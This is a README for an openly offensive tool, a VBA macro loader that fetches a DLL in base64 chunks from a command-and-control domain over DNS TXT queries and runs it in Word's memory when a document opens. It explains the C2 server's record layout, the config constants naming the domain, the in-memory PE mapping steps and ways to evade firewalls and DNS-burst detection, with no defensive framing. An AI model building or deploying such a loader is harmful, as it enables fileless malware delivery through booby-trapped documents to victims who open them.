# Reflective DLL Loader — DNS

Retrieves a DLL via DNS TXT record queries and manually maps it in Word's process — no file touches disk.

## What's here

- `ReflectiveLoader_DNS_Standalone.bas` — the VBA loader (paste into a standard module)
- `ThisDocument.txt` — Document_Open hook to trigger on file open

## Why DNS

DNS is allowed through almost every firewall. TXT record queries look like legitimate DNS traffic (SPF/DKIM lookups, etc.) and are rarely inspected at the payload level. Downsides: slow (one query per ~200 bytes), and high query volume may trigger DNS analytics.

## Server-side

You need an authoritative DNS server for the C2 domain that serves TXT records. The payload is base64-encoded and split across sequential records:

1. `cnt.payload.example.com` TXT `"42"` — total number of chunks
2. `c0.payload.example.com` TXT `"TVqQAAMAAAAE..."` — base64 chunk 0
3. `c1.payload.example.com` TXT `"AAAEAAAAAAAA..."` — base64 chunk 1
4. ...

Encoding: `base64(raw_dll_bytes)` → split into ~200-char chunks → one TXT record per chunk.

A quick Python DNS server with `dnslib` works for testing. For production, a custom authoritative nameserver or a DNS C2 framework.

## Config

Edit the constants at the top of the `.bas` file:

```vba
Private Const C2_DOMAIN As String = "payload.example.com"
Private Const COUNT_LABEL As String = "cnt"
Private Const CHUNK_LABEL As String = "c"
Private Const QUERY_DELAY_MS As Long = 50
```

`QUERY_DELAY_MS` adds a delay between queries to reduce burst detection. Set to 0 for maximum speed.

## How it works

1. Query `cnt.<C2_DOMAIN>` TXT → get chunk count
2. For each chunk: query `c<N>.<C2_DOMAIN>` TXT → get base64 string
3. Concatenate all base64 chunks, decode via `CryptStringToBinaryW` (crypt32.dll)
4. Same PE mapping engine: parse headers, VirtualAlloc, map sections, apply relocations, resolve imports, call DllMain

## DNS record structure internals

The loader reads raw `DNS_RECORD` structures returned by `DnsQuery_W` (dnsapi.dll). TXT record data is at an architecture-dependent offset (24 bytes on x86, 32 bytes on x64) and contains a string count + pointer array. Each string pointer is read via `lstrlenW` + `CopyMemory`.
